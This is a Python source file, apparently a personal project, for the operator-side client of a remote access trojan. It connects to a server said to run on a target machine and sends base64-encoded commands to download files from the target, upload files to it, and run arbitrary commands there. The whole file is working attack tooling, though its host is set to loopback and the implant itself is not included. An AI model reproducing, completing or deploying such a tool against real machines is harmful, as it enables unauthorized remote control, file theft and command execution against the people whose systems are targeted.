#!/usr/bin/python3

# Purpose: RAT Client. This script will speak with the server located on target machine.
# Author: Israel Fernandez
# Date of creation: April 7, 2026

# Deliverables: Upload, Download, Execute

import base64
import socket
import struct


SERVER = "127.0.0.1"  # Loopback
PORT = 9000  # Port to listen on (non-privileged ports are > 1023)
HEADER_SIZE = 4  # 4-byte unsigned int for message length prefix

# Command Protocol
CMD_MSG = b'\x00'
CMD_EXECUTE = b'\x01'
CMD_UPLOAD  = b'\x02'
CMD_DOWNLOAD = b'\x03'

SPLASH = "Welcome to Israel's RAT!"

# This is taken from https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def warn(msg):
    print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC} {msg}")

def err(msg):
    print(f"{bcolors.BOLD}{bcolors.FAIL}[!]{bcolors.ENDC} {msg}")

def success(msg):
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+]{bcolors.ENDC} {msg}")

def log(msg):
    print(f"{bcolors.BOLD}[#]{bcolors.ENDC} {msg}")



def encode(b):
    res = base64.b64encode(b)
    return res

def decode(b):
    res = base64.b64decode(b)
    return res

def connect():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((SERVER, PORT))
        success(f"Connected to server: {SERVER}:{PORT}")
        return (sock, (SERVER, PORT))
    except OSError as e:
        sock.close()
        err(f"Connection failed: {e}")
        return None

def disconnect(session):
    conn, _ = session
    try:
        conn.shutdown(socket.SHUT_RDWR)
    except OSError:
        pass
    
    conn.close()

def send(command, payload, session):
    if payload is None or session is None:
        return -1
    if isinstance(payload, str):
        payload = payload.encode("utf-8")
    if not isinstance(payload, (bytes, bytearray)):
        err(f"Payload must be bytes or str, got {type(payload).__name__}")
        return -1
    if not isinstance(command, (bytes, bytearray)) or len(command) != 1:
        err(f"Command must be exactly 1 byte, got {command!r}")
        return -1

    conn, addr = session
    message = command + payload
    length = struct.pack(">I", len(message))
    conn.sendall(length + message)
    log(f"Sent command {command.hex()} ({len(payload)} bytes) to {addr}")
    return 0

def recv(session):
    (_, addr) = session
    raw_length = _receive_all(session, HEADER_SIZE)
    if raw_length is None:
        return None
    
    length = struct.unpack(">I", raw_length)[0]
    log(f"Expecting {length} bytes from {addr}")
    
    data = _receive_all(session, length)
    if data is None or len(data) < 1:
        return None

    command = data[0:1]
    payload = data[1:]

    log(f"Received command {command.hex()} ({len(payload)} bytes) from {addr}")

    return (command, payload)

def _receive_all(session, length):
    if session is None:
        return None
    
    conn, _ = session
    data = b""
    while len(data) < length:
        chunk = conn.recv(length - len(data))
        if not chunk:
            return None # connection closed mid-message
        data += chunk
    return data


def upload(local_path, session):
    try:
        with open(local_path, 'rb') as file:
            data = file.read()
        filename = local_path.split("/")[-1]
        log(f"Uploading {local_path} ({len(data)}) to {SERVER}:{PORT}")
        if send(CMD_UPLOAD, encode(filename.encode('utf-8')), session) < 0:
            err(f"Failed to send filename")
            return -1
        return send(CMD_MSG, data, session)
    except OSError as e:
        err(f"Failed to read file: {e}")
        return -1

def download(remote_path, session):
    log(f"Download request for {remote_path} from {SERVER}:{PORT}")
    return send(CMD_DOWNLOAD, encode(remote_path.encode('utf-8')), session)

def execute(command_to_execute, session):
    log(f"Executing command: {command_to_execute} on {SERVER}:{PORT}")
    return send(CMD_EXECUTE, encode(command_to_execute.encode('utf-8')), session)

def main():
    try:
        while True:
            print("-"*(len(SPLASH)//2 + len(SPLASH)))
            print("-" + " "*((len(SPLASH)//2)//2 - 1) + SPLASH + " "*((len(SPLASH)//2)//2 - 1) + "-")
            print("-"*(len(SPLASH)//2 + len(SPLASH)))
            print("")
            print("1. Download a file")
            print("2. Upload a file")
            print("3. Execute a command")
            choice = int(input("Please pick a command:"))
            
            session = connect()
            if session is None:
                return -1
            
            if choice == 1:
                filename = input("Please enter the path to download: ")
                download(filename, session)
            elif choice == 2:
                filename = input("Name a file to upload: ")
                upload(filename, session)
            elif choice == 3:
                command = input("Enter the command to run: ")
                execute(command, session)
            else:
                print("Please try again")
                continue
            response = recv(session)
            if response:
                _, payload = response
                success(f"Payload: {decode(payload).decode('utf-8')}")
            
            disconnect(session)
    except KeyboardInterrupt:
        print()
        warn("Exited Successfully")

if __name__ == "__main__":
    main()

